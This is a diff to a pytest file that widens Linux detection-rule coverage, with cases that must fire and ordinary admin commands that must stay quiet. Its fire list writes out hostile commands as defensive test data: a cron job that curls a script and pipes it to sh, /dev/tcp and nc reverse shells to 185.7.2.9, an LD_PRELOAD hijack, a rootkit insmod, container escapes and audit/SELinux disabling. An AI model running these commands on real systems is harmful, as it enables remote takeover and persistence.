@@ -329,11 +329,20 @@ def test_linux_rules_also_work_on_a_plain_syslog_line(name, entry, loaded):
 
 
 def test_every_linux_rule_is_exercised_by_these_cases(loaded):
-    """Otherwise a rule could be added, never fire, and nothing would say so."""
+    """Otherwise a rule could be added, never fire, and nothing would say so.
+
+    This is the guard that caught the widened rule set: eight new rules were
+    added and this failed until each had a case, which is the point of having
+    it rather than trusting that whoever adds a rule also adds a test.
+    """
     linux = {r.title for r in loaded.rules
              if str(r.logsource.get("product", "")).lower() == "linux"}
+
     fired = {h.title for _, entry in LINUX_ATTACKS
              for h in match_all(loaded.rules, journal_event_fields(entry))}
+    fired |= {h.title for _, command in LINUX_COMMANDS_THAT_SHOULD_FIRE
+              for h in match_all(loaded.rules, _journal(command))}
+
     assert linux - fired == set(), f"Linux rules never exercised: {linux - fired}"
 
 
@@ -356,3 +365,97 @@ def test_the_case_sigma_cannot_express_is_covered_elsewhere():
 
     assert [d.rule for d in found] == ["password_spray"]
     assert "T1110.003" in found[0].techniques
+
+
+# --------------------------------------------------------------------------
+# The Linux side, widened
+# --------------------------------------------------------------------------
+#
+# It shipped with four rules against Windows' twelve, so cron persistence,
+# systemd units, LD_PRELOAD, kernel modules and container escape were all
+# blind. The negatives here matter more than the positives: every one of them
+# is ordinary administration that resembles the attack it sits beside, and a
+# baseline that fires on `docker ps` costs more attention than it saves.
+
+LINUX_COMMANDS_THAT_SHOULD_FIRE = [
+    ("cron-dropin", "echo '* * * * * root curl -s http://185.7.2.9/x | sh'"
+                    " | tee /etc/cron.d/update"),
+    ("systemd-unit", "sh -c 'cat > /etc/systemd/system/updater.service' ;"
+                     " systemctl enable updater"),
+    ("ld-so-preload", "sh -c \"echo /tmp/libx.so > /etc/ld.so.preload\""),
+    ("ld-preload-env", "LD_PRELOAD=/dev/shm/evil.so /usr/bin/id"),
+    ("kernel-module", "insmod /tmp/rootkit.ko"),
+    ("docker-sock-mount", "docker run -v /var/run/docker.sock:"
+                          "/var/run/docker.sock -it alpine sh"),
+    ("nsenter-escape", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"),
+    ("reverse-shell-devtcp", "bash -c 'bash -i >& /dev/tcp/185.7.2.9/4444 0>&1'"),
+    ("nc-reverse-shell", "nc 185.7.2.9 4444 -e /bin/bash"),
+    ("auditctl-flush", "auditctl -D"),
+    ("setenforce-permissive", "setenforce 0"),
+    ("suid-shell", "chmod u+s /tmp/bash"),
+]
+
+LINUX_COMMANDS_THAT_MUST_NOT = [
+    ("apt-install", "apt-get install -y nginx"),
+    ("systemctl-restart", "systemctl restart nginx"),
+    ("read-crontab", "cat /etc/crontab"),
+    ("docker-ps", "docker ps -a"),
+    ("docker-build", "docker build -t app ."),
+    ("nc-port-check", "nc -z 10.0.0.5 443"),
+    ("chmod-normal", "chmod 755 /usr/local/bin/deploy.sh"),
+    ("modprobe-from-lib", "modprobe /lib/modules/6.1.0/kernel/fs/nfs.ko"),
+    ("curl-to-file", "curl -o /tmp/rel.tgz https://vendor/rel.tgz"),
+    ("find-suid-audit", "find / -perm -4000 -type f"),
+    ("ufw-status", "ufw status verbose"),
+    ("journalctl", "journalctl -u nginx --since today"),
+]
+
+
+def _journal(command: str) -> dict:
+    return journal_event_fields({"_COMM": command.split()[0],
+                                 "_CMDLINE": command,
+                                 "MESSAGE": f"COMMAND={command}"})
+
+
+def _syslog(command: str) -> dict:
+    return text_event_fields(
+        f"Aug 25 03:14:07 web-01 sudo: jdoe : TTY=pts/0 ; USER=root ;"
+        f" COMMAND={command}", "/var/log/auth.log")
+
+
+@pytest.mark.parametrize("name,command", LINUX_COMMANDS_THAT_SHOULD_FIRE,
+                         ids=[c[0] for c in LINUX_COMMANDS_THAT_SHOULD_FIRE])
+def test_linux_attacks_fire_on_the_journal(name, command, loaded):
+    assert match_all(loaded.rules, _journal(command)), name
+
+
+@pytest.mark.parametrize("name,command", LINUX_COMMANDS_THAT_SHOULD_FIRE,
+                         ids=[c[0] for c in LINUX_COMMANDS_THAT_SHOULD_FIRE])
+def test_linux_attacks_fire_on_a_syslog_line_too(name, command, loaded):
+    """A rule written only against `CommandLine` is dead on a host using
+    rsyslog rather than journald, and nothing would say so."""
+    assert match_all(loaded.rules, _syslog(command)), name
+
+
+@pytest.mark.parametrize("name,command", LINUX_COMMANDS_THAT_MUST_NOT,
+                         ids=[c[0] for c in LINUX_COMMANDS_THAT_MUST_NOT])
+def test_ordinary_linux_administration_stays_quiet(name, command, loaded):
+    """Each of these sits beside an attack it resembles: `docker ps` beside a
+    socket mount, `find -perm -4000` beside setting SUID, `modprobe` from
+    /lib beside insmod from /tmp. The path and the arguments are what
+    separate them."""
+    hits = match_all(loaded.rules, _journal(command))
+    assert not hits, f"{name} falsely matched {[h.title for h in hits]}"
+
+
+def test_linux_coverage_is_no_longer_a_token_gesture(loaded):
+    """Four rules against Windows' twelve left cron, systemd, LD_PRELOAD,
+    kernel modules and container escape entirely blind."""
+    linux = [r for r in loaded.rules
+             if str(r.logsource.get("product", "")).lower() == "linux"]
+    assert len(linux) >= 12, f"only {len(linux)} Linux rules"
+
+    covered = {t for r in linux for t in r.techniques}
+    for technique in ("T1053.003", "T1543.002", "T1574.006", "T1547.006",
+                      "T1611", "T1548.001"):
+        assert technique in covered, technique
